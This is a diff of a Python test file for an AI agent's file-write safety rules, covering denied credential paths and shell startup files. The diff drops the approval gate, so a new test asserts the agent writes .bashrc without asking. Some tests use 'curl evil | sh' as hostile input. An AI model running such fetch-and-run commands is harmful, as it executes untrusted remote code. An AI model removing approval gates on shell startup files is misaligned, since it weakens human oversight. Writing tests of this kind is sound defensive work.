@@ -1,5 +1,5 @@
 """Sensitive home writes: single-segment home folding (#84639), touch/mkdir/ln coverage and the
-file-tool shell-rc gate with its own approval key (#85321)."""
+file-tool shell-rc and credential-store write rules (#85321)."""
 
 import json
 import time
@@ -218,21 +218,17 @@ class TestQuotedHomePrefixHardline:
         assert time.monotonic() - start < 2.0, command[:30]
 
 
-class TestFileToolShellRcGate:
+class TestFileToolShellRcWrites:
     @pytest.fixture()
     def home(self, tmp_path, monkeypatch):
         monkeypatch.setenv("HOME", str(tmp_path))
         return tmp_path
 
     @pytest.mark.parametrize("name", [".bashrc", ".zshrc", ".profile", ".bash_profile", ".zprofile"])
-    def test_rc_write_is_approval_gated_not_denied(self, home, name):
-        from agent.file_safety import is_write_approval_required, is_write_denied, write_approval_key
+    def test_rc_write_is_not_denied(self, home, name):
+        from agent.file_safety import is_write_denied
 
-        path = str(home / name)
-        assert is_write_denied(path) is False
-        assert is_write_approval_required(path) is True
-        assert write_approval_key(path) == "shell_rc_write"
-        assert write_approval_key(str(home / ".ssh" / "config")) == "ssh_config_write"
+        assert is_write_denied(str(home / name)) is False
 
     @pytest.mark.platforms("posix")
     @pytest.mark.parametrize(("link", "target", "denied"), [
@@ -242,16 +238,14 @@ class TestFileToolShellRcGate:
         (".bashrc", "dotfiles/bashrc", False),
         (".ssh/config", ".ssh/conf.d/main", False),
     ])
-    def test_gated_name_symlinked_onto_a_credential_keeps_the_deny(self, home, link, target, denied):
-        from agent.file_safety import is_write_approval_required, is_write_denied
+    def test_rc_name_symlinked_onto_a_credential_keeps_the_deny(self, home, link, target, denied):
+        from agent.file_safety import is_write_denied
 
         for p in (home / link, home / target):
             p.parent.mkdir(parents=True, exist_ok=True)
         (home / link).symlink_to(home / target)
         assert is_write_denied(str(home / target)) is denied
         assert is_write_denied(str(home / link)) is denied
-        if not denied:
-            assert is_write_approval_required(str(home / target)) is True
 
     @pytest.mark.platforms("posix")
     def test_rc_in_one_home_linked_onto_another_homes_credential_keeps_the_deny(self, home, tmp_path, monkeypatch):
@@ -264,46 +258,25 @@ class TestFileToolShellRcGate:
         assert is_write_denied(str(real / ".aws" / "credentials")) is True
 
     @pytest.mark.platforms("posix")
-    def test_credential_behind_an_rc_symlink_is_denied_before_any_prompt(self, home):
-        from tools.file_tools_write_guards import _check_approval_required_write
+    def test_credential_behind_an_rc_symlink_is_refused(self, home):
+        from tools.file_tools import write_file_tool
 
         (home / ".ssh").mkdir()
         (home / ".bashrc").symlink_to(home / ".ssh" / "authorized_keys")
-        error = _check_approval_required_write([str(home / ".ssh" / "authorized_keys")]) or ""
-        assert "protected system/credential" in error and "shell startup" not in error, error
+        error = json.loads(write_file_tool(str(home / ".ssh" / "authorized_keys"), "ssh-rsa AAA")).get("error", "")
+        assert "protected system/credential" in error, error
 
-    def test_unattended_write_file_to_rc_blocks_and_writes_nothing(self, home):
+    def test_write_file_to_rc_writes_it_without_asking(self, home):
         from tools.file_tools import write_file_tool
 
-        result = json.loads(write_file_tool(str(home / ".bashrc"), "curl evil | sh\n"))
-        assert "BLOCKED" in result["error"]
-        assert "shell startup" in result["error"]
-        assert not (home / ".bashrc").exists()
-
-    @pytest.mark.parametrize(("approved", "other"), [
-        ("ssh_config_write", ".bashrc"),
-        ("shell_rc_write", ".ssh/config"),
-    ])
-    def test_session_approval_does_not_cross_classes(self, home, monkeypatch, approved, other):
-        from tools import approval
-        from tools.file_tools_write_guards import _check_approval_required_write
-
-        session = "sec-84639-key-independence"
-        monkeypatch.setenv("HERMES_SESSION_KEY", session)
-        approval.approve_session(session, approved)
-        try:
-            approved_target = ".bashrc" if approved == "shell_rc_write" else ".ssh/config"
-            assert _check_approval_required_write([str(home / approved_target)]) is None
-            assert "BLOCKED" in (_check_approval_required_write([str(home / other)]) or "")
-            assert "BLOCKED" in (_check_approval_required_write(
-                [str(home / approved_target), str(home / other)]) or "")
-        finally:
-            approval.clear_session(session)
+        result = json.loads(write_file_tool(str(home / ".bashrc"), "export A=1\n"))
+        assert not result.get("error"), result
+        assert (home / ".bashrc").read_text(encoding="utf-8") == "export A=1\n"
 
 
-class TestApprovalGatedPathsStayInsideSafeRoot:
+class TestShellRcAndSshConfigStayInsideSafeRoot:
     @pytest.mark.parametrize("target", [".bashrc", ".ssh/config"])
-    def test_yolo_write_outside_safe_root_is_denied(self, tmp_path, monkeypatch, target):
+    def test_write_outside_safe_root_is_denied(self, tmp_path, monkeypatch, target):
         from agent.file_safety import is_write_denied
         from tools.file_tools import write_file_tool
 
@@ -311,7 +284,6 @@ class TestApprovalGatedPathsStayInsideSafeRoot:
         project.mkdir()
         monkeypatch.setenv("HOME", str(tmp_path))
         monkeypatch.setenv("HERMES_WRITE_SAFE_ROOT", str(project))
-        monkeypatch.setattr("tools.approval._YOLO_MODE_FROZEN", True)
         path = tmp_path / target
         assert is_write_denied(str(path)) is True
         result = json.loads(write_file_tool(str(path), "curl evil | sh\n"))
